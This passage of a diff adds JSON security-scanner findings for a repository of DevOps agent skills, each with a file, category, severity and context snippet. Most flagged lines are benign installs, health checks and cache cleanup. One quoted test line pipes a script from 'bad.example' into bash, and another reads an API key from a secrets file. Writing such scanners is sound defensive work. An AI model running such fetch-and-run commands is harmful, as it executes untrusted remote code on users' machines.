+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 187,
+  "ctx": "echo \"  brew install ansible ansible-lint yamllint\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/scripts/setup_tools.sh",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 210,
+  "ctx": "echo \"  sudo yum install -y python3-pip\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/scripts/test_role.sh",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 181,
+  "ctx": "if ! pip install --quiet --upgrade pip setuptoo..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/scripts/test_role.sh",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 186,
+  "ctx": "if ! pip install --quiet molecule \"$DRIVER_PLUG..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/scripts/test_role.sh",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 190,
+  "ctx": "if ! pip install --quiet molecule ansible-core ..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/scripts/test_role.sh",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 275,
+  "ctx": "...echo \"To install permanently: pip install molecule $DRIVER_PLUGIN_HINT\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/scripts/test_role.sh",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 293,
+  "ctx": "echo \"  pip install molecule $DRIVER_PLUGIN_HINT\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/scripts/validate_inventory.sh",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 103,
+  "ctx": "pip install --quiet --upgrade pip setuptoo..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/scripts/validate_inventory.sh",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 104,
+  "ctx": "pip install --quiet ansible yamllint"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/scripts/validate_playbook.sh",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 115,
+  "ctx": "pip install --quiet --upgrade pip setuptoo..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/scripts/validate_playbook.sh",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 116,
+  "ctx": "pip install --quiet ansible-core ansible-l..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/scripts/validate_playbook.sh",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 221,
+  "ctx": "...echo \"To install permanently: pip install ansible ansible-lint yamllint\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/scripts/validate_playbook.sh",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 231,
+  "ctx": "...echo \"To install permanently: pip install ansible ansible-lint yamllint\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/scripts/validate_playbook_security.sh",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 93,
+  "ctx": "pip install --quiet --upgrade pip setuptoo..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/scripts/validate_playbook_security.sh",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 94,
+  "ctx": "pip install --quiet checkov"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/scripts/validate_role.sh",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 115,
+  "ctx": "pip install --quiet --upgrade pip setuptoo..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/scripts/validate_role.sh",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 116,
+  "ctx": "pip install --quiet ansible-core ansible-l..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/scripts/validate_role.sh",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 338,
+  "ctx": "...echo \"To install permanently: pip install ansible ansible-lint yamllint\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/scripts/validate_role.sh",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 348,
+  "ctx": "...echo \"To install permanently: pip install ansible ansible-lint yamllint\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/scripts/validate_role_security.sh",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 87,
+  "ctx": "pip install --quiet --upgrade pip setuptoo..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/scripts/validate_role_security.sh",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 88,
+  "ctx": "pip install --quiet checkov"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/SKILL.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 734,
+  "ctx": "- Exposing services on 0.0.0.0"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/test/roles/geerlingguy.mysql/.github/workflows/release.yml",
+  "category": "Shell Injection",
+  "pattern": "Bash Command Substitution $(...)",
+  "severity": "Severity.MEDIUM",
+  "line": 40,
+  "ctx": "$(echo ${{ github.repository }} | cu..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/test/roles/geerlingguy.mysql/defaults/main.yml",
+  "category": "Prompt Injection",
+  "pattern": "Indirect Prompt Extraction",
+  "severity": "Severity.HIGH",
+  "line": 109,
+  "ctx": "# mysqldump settings."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/test/roles/geerlingguy.mysql/README.md",
+  "category": "Data Exfiltration",
+  "pattern": "Internal Network Probe",
+  "severity": "Severity.HIGH",
+  "line": 44,
+  "ctx": "...ror like `ERROR 1045 (28000): Access denied for user 'root'@'localhost' (using password: YES)` after..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/test/roles/geerlingguy.mysql/README.md",
+  "category": "Data Exfiltration",
+  "pattern": "Internal Network Probe",
+  "severity": "Severity.HIGH",
+  "line": 46,
+  "ctx": "...ror like `ERROR 1698 (28000): Access denied for user 'root'@'localhost' (using password: YES)` when ..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/test/roles/geerlingguy.mysql/README.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 121,
+  "ctx": "mysql_bind_address: '0.0.0.0'"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/azure-pipelines-validator/scripts/check_security.py",
+  "category": "Social Engineering",
+  "pattern": "Approval Bypass (LLM08)",
+  "severity": "Severity.HIGH",
+  "line": 65,
+  "ctx": "... 'skip-verification', 'Do not skip verification checks'),"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/azure-pipelines-validator/scripts/check_security.py",
+  "category": "Prompt Injection",
+  "pattern": "Verification Bypass (ASI09)",
+  "severity": "Severity.HIGH",
+  "line": 65,
+  "ctx": "... 'skip-verification', 'Do not skip verification checks'),"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/azure-pipelines-validator/scripts/check_security.py",
+  "category": "Data Exfiltration",
+  "pattern": "Password in Cleartext",
+  "severity": "Severity.HIGH",
+  "line": 202,
+  "ctx": "...          # mixed lines like \"password=hardcoded $(Build.Id)\" are still caught..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/azure-pipelines-validator/scripts/python_wrapper.sh",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 53,
+  "ctx": "if ! pip install --quiet --upgrade pip >&2; the..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/azure-pipelines-validator/scripts/python_wrapper.sh",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 60,
+  "ctx": "if ! pip install --quiet pyyaml yamllint >&2; t..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/azure-pipelines-validator/scripts/python_wrapper.sh",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 75,
+  "ctx": "if ! pip install --quiet yamllint >&2; then"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/azure-pipelines-validator/scripts/test_regressions.py",
+  "category": "Output Injection",
+  "pattern": "Template Injection (LLM05)",
+  "severity": "Severity.HIGH",
+  "line": 0,
+  "ctx": "...f): config = { \"steps\": [ { \"${{ if eq(variables['Build.SourceBranch'], 'refs/heads/main') }}\": [ {\"script\": \"curl -fsSL https://bad.example/install.sh | bas"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/azure-pipelines-validator/scripts/test_regressions.py",
+  "category": "Dangerous Command",
+  "pattern": "Remote Code Execution",
+  "severity": "Severity.CRITICAL",
+  "line": 85,
+  "ctx": "- script: curl -fsSL https://bad.example/install.sh | bash"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/azure-pipelines-validator/scripts/yamllint_check.sh",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 62,
+  "ctx": "echo \"   To enable: pip install yamllint\" >&2"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/bash-script-validator/docs/grep-reference.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 363,
+  "ctx": "grep \"192.168.1.1\" file"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/bash-script-validator/docs/grep-reference.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 369,
+  "ctx": "grep -F \"192.168.1.1\" file"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/bash-script-validator/docs/regex-reference.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 318,
+  "ctx": "grep '192.168.1.1' file"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/bash-script-validator/docs/sed-reference.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 351,
+  "ctx": "sed 's/192.168.1.1/new/' file"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/bash-script-validator/docs/sed-reference.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 357,
+  "ctx": "sed 's|192.168.1.1|new|' file"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/bash-script-validator/scripts/validate.sh",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 223,
+  "ctx": "...    echo \"    1. System-wide: brew install shellcheck (macOS)\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/bash-script-validator/scripts/validate.sh",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 233,
+  "ctx": "...    echo \"    1. System-wide: brew install shellcheck (macOS)\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/dockerfile-generator/examples/java-springboot.Dockerfile",
+  "category": "Data Exfiltration",
+  "pattern": "Internal Network Probe",
+  "severity": "Severity.HIGH",
+  "line": 42,
+  "ctx": "CMD curl -f http://localhost:8080/actuator/health || exit ..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/dockerfile-generator/examples/python-fastapi.Dockerfile",
+  "category": "Code Obfuscation",
+  "pattern": "Suspicious open() in Agent Input",
+  "severity": "Severity.HIGH",
+  "line": 45,
+  "ctx": "...ib.request; urllib.request.urlopen('http://localhost:8000/health')..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/dockerfile-generator/references/language_specific_guides.md",
+  "category": "Code Obfuscation",
+  "pattern": "Suspicious open() in Agent Input",
+  "severity": "Severity.HIGH",
+  "line": 136,
+  "ctx": "...lib.request;urllib.request.urlopen('http://localhost:8000/health')..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/dockerfile-generator/references/language_specific_guides.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 137,
+  "ctx": "...corn\", \"main:app\", \"--host\", \"0.0.0.0\", \"--port\", \"8000\"]"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/dockerfile-generator/references/language_specific_guides.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 168,
+  "ctx": "CMD [\"gunicorn\", \"--bind\", \"0.0.0.0:8000\", \"project.wsgi:applicat..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/dockerfile-generator/references/language_specific_guides.md",
+  "category": "Data Exfiltration",
+  "pattern": "Internal Network Probe",
+  "severity": "Severity.HIGH",
+  "line": 199,
+  "ctx": "HEALTHCHECK CMD wget --no-verbose --tries=1 --spider http://localhost:8080/health || exit 1"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/dockerfile-generator/references/language_specific_guides.md",
+  "category": "Data Exfiltration",
+  "pattern": "Internal Network Probe",
+  "severity": "Severity.HIGH",
+  "line": 269,
+  "ctx": "HEALTHCHECK CMD curl -f http://localhost:8080/actuator/health || exit ..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/dockerfile-generator/references/language_specific_guides.md",
+  "category": "Data Exfiltration",
+  "pattern": "Internal Network Probe",
+  "severity": "Severity.HIGH",
+  "line": 293,
+  "ctx": "HEALTHCHECK CMD curl -f http://localhost:8080/actuator/health || exit ..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/dockerfile-generator/references/language_specific_guides.md",
+  "category": "Data Exfiltration",
+  "pattern": "Internal Network Probe",
+  "severity": "Severity.HIGH",
+  "line": 319,
+  "ctx": "HEALTHCHECK CMD curl -f http://localhost:8080/actuator/health || exit ..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/dockerfile-generator/references/language_specific_guides.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 381,
+  "ctx": "...c\", \"rails\", \"server\", \"-b\", \"0.0.0.0\"]"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/dockerfile-generator/references/language_specific_guides.md",
+  "category": "Data Exfiltration",
+  "pattern": "Internal Network Probe",
+  "severity": "Severity.HIGH",
+  "line": 428,
+  "ctx": "HEALTHCHECK CMD curl -f http://localhost:8080/health || exit 1"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/dockerfile-generator/references/multistage_builds.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 280,
+  "ctx": "...corn\", \"main:app\", \"--host\", \"0.0.0.0\"]"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/dockerfile-generator/references/optimization_patterns.md",
+  "category": "Data Exfiltration",
+  "pattern": "Internal Network Probe",
+  "severity": "Severity.HIGH",
+  "line": 330,
+  "ctx": "CMD wget --no-verbose --tries=1 --spider http://localhost:8080/health || exit 1"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/dockerfile-generator/references/optimization_patterns.md",
+  "category": "Data Exfiltration",
+  "pattern": "Internal Network Probe",
+  "severity": "Severity.HIGH",
+  "line": 333,
+  "ctx": "# Bad: HEALTHCHECK CMD curl http://localhost/full-db-check"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/dockerfile-generator/scripts/generate_golang.sh",
+  "category": "Data Exfiltration",
+  "pattern": "Internal Network Probe",
+  "severity": "Severity.HIGH",
+  "line": 153,
+  "ctx": "CMD wget --no-verbose --tries=1 --spider http://localhost:PORT_NUMBER/health || exit 1"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/dockerfile-generator/scripts/generate_java.sh",
+  "category": "Dangerous Command",
+  "pattern": "Destructive Shell Command",
+  "severity": "Severity.MEDIUM",
+  "line": 105,
+  "ctx": "rm -rf /var/lib/apt/lists/* && \\"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/dockerfile-generator/scripts/generate_java.sh",
+  "category": "Data Exfiltration",
+  "pattern": "Internal Network Probe",
+  "severity": "Severity.HIGH",
+  "line": 119,
+  "ctx": "CMD curl -f http://localhost:PORT_NUMBER/actuator/health |..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/dockerfile-generator/scripts/generate_java.sh",
+  "category": "Dangerous Command",
+  "pattern": "Destructive Shell Command",
+  "severity": "Severity.MEDIUM",
+  "line": 154,
+  "ctx": "rm -rf /var/lib/apt/lists/* && \\"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/dockerfile-generator/scripts/generate_java.sh",
+  "category": "Data Exfiltration",
+  "pattern": "Internal Network Probe",
+  "severity": "Severity.HIGH",
+  "line": 168,
+  "ctx": "CMD curl -f http://localhost:PORT_NUMBER/actuator/health |..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/dockerfile-generator/scripts/generate_python.sh",
+  "category": "Dangerous Command",
+  "pattern": "Destructive Shell Command",
+  "severity": "Severity.MEDIUM",
+  "line": 159,
+  "ctx": "&& rm -rf /var/lib/apt/lists/*"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/dockerfile-generator/scripts/generate_python.sh",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 165,
+  "ctx": "RUN pip install --no-cache-dir --user -r requi..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/dockerfile-generator/scripts/generate_python.sh",
+  "category": "Code Obfuscation",
+  "pattern": "Suspicious open() in Agent Input",
+  "severity": "Severity.HIGH",
+  "line": 193,
+  "ctx": "...ib.request; urllib.request.urlopen('http://localhost:PORT_NUMBER/h..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/dockerfile-generator/SKILL.md",
+  "category": "Dangerous Command",
+  "pattern": "Destructive Shell Command",
+  "severity": "Severity.MEDIUM",
+  "line": 279,
+  "ctx": "&& rm -rf /var/lib/apt/lists/*"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/dockerfile-generator/SKILL.md",
+  "category": "Code Obfuscation",
+  "pattern": "Suspicious open() in Agent Input",
+  "severity": "Severity.HIGH",
+  "line": 315,
+  "ctx": "...ib.request; urllib.request.urlopen('http://localhost:8000/health')..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/dockerfile-generator/SKILL.md",
+  "category": "Dangerous Command",
+  "pattern": "Destructive Shell Command",
+  "severity": "Severity.MEDIUM",
+  "line": 392,
+  "ctx": "rm -rf /var/lib/apt/lists/* && \\"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/dockerfile-generator/SKILL.md",
+  "category": "Data Exfiltration",
+  "pattern": "Internal Network Probe",
+  "severity": "Severity.HIGH",
+  "line": 406,
+  "ctx": "CMD curl -f http://localhost:8080/actuator/health || exit ..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/dockerfile-generator/SKILL.md",
+  "category": "Data Exfiltration",
+  "pattern": "Internal Network Probe",
+  "severity": "Severity.HIGH",
+  "line": 606,
+  "ctx": "curl http://localhost:3000/health"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/dockerfile-generator/SKILL.md",
+  "category": "Data Exfiltration",
+  "pattern": "Sensitive File Access Request",
+  "severity": "Severity.CRITICAL",
+  "line": 715,
+  "ctx": "API_KEY=$(cat /run/secrets/api_key) ./configure"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/dockerfile-generator/SKILL.md",
+  "category": "Dangerous Command",
+  "pattern": "Destructive Shell Command",
+  "severity": "Severity.MEDIUM",
+  "line": 735,
+  "ctx": "RUN rm -rf /var/lib/apt/lists/*"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/dockerfile-generator/SKILL.md",
+  "category": "Dangerous Command",
+  "pattern": "Destructive Shell Command",
+  "severity": "Severity.MEDIUM",
+  "line": 740,
+  "ctx": "rm -rf /var/lib/apt/lists/*"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/dockerfile-generator/SKILL.md",
+  "category": "Data Exfiltration",
+  "pattern": "Internal Network Probe",
+  "severity": "Severity.HIGH",
+  "line": 762,
+  "ctx": "CMD curl -f http://localhost:3000/health || exit 1"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/dockerfile-generator/SKILL.md",
+  "category": "Dangerous Command",
+  "pattern": "Destructive Shell Command",
+  "severity": "Severity.MEDIUM",
+  "line": 818,
+  "ctx": "rm -rf /var/lib/apt/lists/*"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/dockerfile-generator/SKILL.md",
+  "category": "Code Obfuscation",
+  "pattern": "Suspicious open() in Agent Input",
+  "severity": "Severity.HIGH",
+  "line": 832,
+  "ctx": "...ib.request; urllib.request.urlopen('http://localhost:8000/health')..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/dockerfile-generator/SKILL.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 833,
+  "ctx": "...corn\", \"main:app\", \"--host\", \"0.0.0.0\", \"--port\", \"8000\"]"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/dockerfile-validator/references/docker_best_practices.md",
+  "category": "Data Exfiltration",
+  "pattern": "Internal Network Probe",
+  "severity": "Severity.HIGH",
+  "line": 209,
+  "ctx": "CMD curl -f http://localhost:8080/health || exit 1"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/dockerfile-validator/references/optimization_guide.md",
+  "category": "Data Exfiltration",
+  "pattern": "Internal Network Probe",
+  "severity": "Severity.HIGH",
+  "line": 251,
+  "ctx": "CMD curl -f http://localhost:8080/health || exit 1"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/dockerfile-validator/references/security_checklist.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 64,
+  "ctx": "- [ ] Don't bind to 0.0.0.0 in development images"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/dockerfile-validator/references/security_checklist.md",
+  "category": "Data Exfiltration",
+  "pattern": "Internal Network Probe",
+  "severity": "Severity.HIGH",
+  "line": 190,
+  "ctx": "HEALTHCHECK CMD curl -f http://localhost/ || exit 1"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/dockerfile-validator/scripts/dockerfile-validate.sh",
+  "category": "Dangerous Command",
+  "pattern": "Destructive Shell Command",
+  "severity": "Severity.MEDIUM",
+  "line": 393,
+  "ctx": "echo \"  → Add '&& rm -rf /var/lib/apt/lists/*' to the sa..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/fluentbit-generator/scripts/test_generate_config.py",
+  "category": "Code Obfuscation",
+  "pattern": "Python subprocess/os.system",
+  "severity": "Severity.MEDIUM",
+  "line": 366,
+  "ctx": "result = subprocess.run("
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/fluentbit-validator/scripts/validate_config.py",
+  "category": "Code Obfuscation",
+  "pattern": "Python subprocess/os.system",
+  "severity": "Severity.MEDIUM",
+  "line": 1326,
+  "ctx": "result = subprocess.run("
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/fluentbit-validator/tests/test_validate_config.py",
+  "category": "Code Obfuscation",
+  "pattern": "Python subprocess/os.system",
+  "severity": "Severity.MEDIUM",
+  "line": 53,
+  "ctx": "proc = subprocess.run(cmd, capture_output=True, text..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/fluentbit-validator/tests/test_validate_config.py",
+  "category": "Code Obfuscation",
+  "pattern": "Python subprocess/os.system",
+  "severity": "Severity.MEDIUM",
+  "line": 76,
+  "ctx": "proc = subprocess.run(cmd, capture_output=True, text..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/fluentbit-validator/tests/test_validate_config.py",
+  "category": "Code Obfuscation",
+  "pattern": "Python subprocess/os.system",
+  "severity": "Severity.MEDIUM",
+  "line": 478,
+  "ctx": "proc = subprocess.run("
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/github-actions-generator/examples/actions/setup-node-cached/action.yml",
+  "category": "Shell Injection",
+  "pattern": "Bash Command Substitution $(...)",
+  "severity": "Severity.MEDIUM",
+  "line": 90,
+  "ctx": "...       echo \"Node.js version: $(node --version)\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
